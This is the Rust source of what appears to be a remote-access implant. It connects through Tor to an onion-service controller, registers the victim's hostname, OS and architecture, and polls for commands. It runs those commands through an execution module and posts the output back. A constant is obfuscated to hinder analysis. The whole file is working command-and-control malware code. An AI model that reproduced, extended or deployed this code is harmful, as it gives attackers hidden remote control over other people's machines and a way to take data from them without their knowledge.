mod config;
mod helpers;
mod exc;

use arti_client::{
    TorClient,
    TorClientConfig,
    StreamPrefs,
    DataStream,
};
use goldberg::goldberg_int;
use tokio::io::{
    AsyncWriteExt,
    AsyncReadExt,
    Result,
};
use gethostname::gethostname;
use std::{env, io}; 
use serde_json;
use serde::{Serialize, Deserialize};

#[derive(Serialize)]
struct RegisterRequest {
    hostname: String,
    os: String,
    arch: String,
}

#[derive(Deserialize)]
struct RegisterResponse {
    id: String,
}

#[derive(Deserialize)]
struct Message {
    id: String,
    request: String,
}

#[derive(Serialize)]
struct OutputMessage {
    #[serde(rename = "messageId")]
    message_id: String,
    response: String,
}

#[tokio::main]
async fn main() {
    // Agent's configuration:
    let address = config::get_address();
    let port: u16 = goldberg_int!(80);

    // Agent's environment details:
    let hostname = match gethostname().into_string() {
        Ok(name) => name,
        Err(_) => "unknown".to_string(),
    };
    
    let os_name = env::consts::OS;
    let sys_arch = env::consts::ARCH;

    println!("agent started: {:?}, {}, {}", hostname, os_name, sys_arch);

    let mut id = String::new();
    match helpers::load_id().await {
        Some(saved_id) => {
            id = saved_id;
        },
        _ => {}
    }

    let mut s_prefs = StreamPrefs::new();
    s_prefs.connect_to_onion_services(arti_client::config::BoolOrAuto::Explicit(true));

    let config = TorClientConfig::default();

    let tor_client = match TorClient::create_bootstrapped(config).await {
        Ok(client) => client,
        Err(e) => {
            eprintln!("failed to create tor client: {:?}", e);
            helpers::wait().await;
            // TODO: Do something else other than exit.
            return;
        }
    };

    println!("tor client initialized");

    loop {
        println!("connecting to: {} {}", address.clone(), port);

        let mut stream = match tor_client.connect_with_prefs((address.clone(), port), &s_prefs).await {
            Ok(s) => s,
            Err(e) => {
                eprintln!("failed to connect to the server: {:?}", e);
                helpers::wait().await;
                continue;
            }
        };

        if id.len() == 0 {
            let id_resp = match register(&hostname, os_name, sys_arch, &mut stream).await {
                Ok(id_resp) => id_resp,
                Err(e) => {
                    eprintln!("registration error: {}", e);
                    helpers::wait().await;
                    continue;
                }, 
            };

            id = id_resp.id;

            println!("Agent's Assigned A New ID");
        }

        println!("fetching messages");

        let messages = match get_messages(&id, &mut stream).await {
            Ok(messages) => messages,
            Err(e) => {
                eprintln!("get messages error: {}", e);
                helpers::wait().await;
                continue;
            }
        };

        println!("got messages: {}", messages.len());

        for message in messages {
            let interpreted = match exc::run(&message.request) {
                Ok(output) => output,
                Err(e) => {
                    format!("{}", e)
                }
            };

            println!("sending response: {} - {}\n{}", message.id.clone(), message.request.clone(), interpreted.clone());

            let mut stream = match tor_client.connect_with_prefs((address.clone(), port), &s_prefs).await {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("failed to connect to the server: {:?}", e);
                    helpers::wait().await;
                    continue;
                }
            };

            match send_message(&message.id, &interpreted, &mut stream).await {
                Ok(_) => {},
                Err(e) => {
                    eprintln!("failed to send message: {}", e);
                    helpers::wait().await;
                    continue;
                },
            };
        }

        helpers::wait().await;
    }
}

#[inline]
async fn register(hostname: &String, os: &str, arch: &str, stream: &mut DataStream) -> Result<RegisterResponse> {
    let identity = RegisterRequest{
        hostname: hostname.clone(),
        os: os.to_string(),
        arch: arch.to_string(),
    };

    let json_identity = match serde_json::to_string(&identity) {
        Ok(jj) => jj.as_bytes().to_vec(),
        Err(e) => {
            eprintln!("failed to serialize identity to json: {:?}", e);
            helpers::wait().await;
            return Err(e.into());
        }
    };

    let json_identity_length = json_identity.len().to_string();

    let mut req_buff = b"PUT /v1 HTTP/1.1\r\nHost: x\r\nConnection: close\r\nContent-Length: ".to_vec();
    req_buff.extend(json_identity_length.as_bytes());
    req_buff.extend(b"\r\n\r\n");
    req_buff.extend(&json_identity);

    match stream.write_all(&req_buff).await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    match stream.flush().await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    let mut resp_buff = Vec::new();
    match stream.read_to_end(&mut resp_buff).await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    let strresp = String::from_utf8_lossy(&resp_buff);
    let segments: Vec<&str> = strresp.split("\r\n").collect();
    let last = match segments.last() {
        Some(x) => x,
        _ => {
            return Err(io::Error::new(io::ErrorKind::Other, "response stream contains no line separators"));
        },
    };

    let id_resp: RegisterResponse = match serde_json::from_str(last) {
        Ok(resp) => resp,
        Err(e) => {
            return Err(e.into());
        }
    };

    match helpers::save_id(&id_resp.id).await {
        Ok(_) => {},
        Err(e) => {
            return Err(e.into());
        },
    };

    Ok(id_resp)
}

#[inline]
async fn get_messages(agent_id: &String, stream: &mut DataStream) -> Result<Vec<Message>> {
    let mut req_buff = b"GET /v1/".to_vec();
    req_buff.extend(agent_id.as_bytes());
    req_buff.extend(b" HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n");

    match stream.write_all(&req_buff).await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    match stream.flush().await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    let mut resp_buff = Vec::new();
    match stream.read_to_end(&mut resp_buff).await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    let strresp = String::from_utf8_lossy(&resp_buff);
    let segments: Vec<&str> = strresp.split("\r\n").collect();
    let last = match segments.last() {
        Some(x) => x,
        _ => {
            return Err(io::Error::new(io::ErrorKind::Other, "response stream contains no line separators"));
        }
    };

    let messages: Vec<Message> = match serde_json::from_str(last) {
        Ok(resp) => resp,
        Err(e) => {
            return Err(e.into());
        }
    };

    Ok(messages)
}

#[inline]
async fn send_message(msg_id: &String, response: &String, stream: &mut DataStream) -> Result<bool> {
    let req = OutputMessage{
        message_id: msg_id.to_string(),
        response: response.to_string(),
    };

    let json_req = match serde_json::to_string(&req) {
        Ok(jj) => jj.as_bytes().to_vec(),
        Err(e) => {
            return Err(e.into());
        }
    };
    
    let req_len = json_req.len().to_string();

    let mut req_buff = b"POST /v1 HTTP/1.1\r\nHost: x\r\nConnection: close\r\nContent-Length: ".to_vec();
    req_buff.extend(req_len.as_bytes());
    req_buff.extend(b"\r\n\r\n");
    req_buff.extend(json_req);

    match stream.write_all(&req_buff).await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    match stream.flush().await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    Ok(true)
}
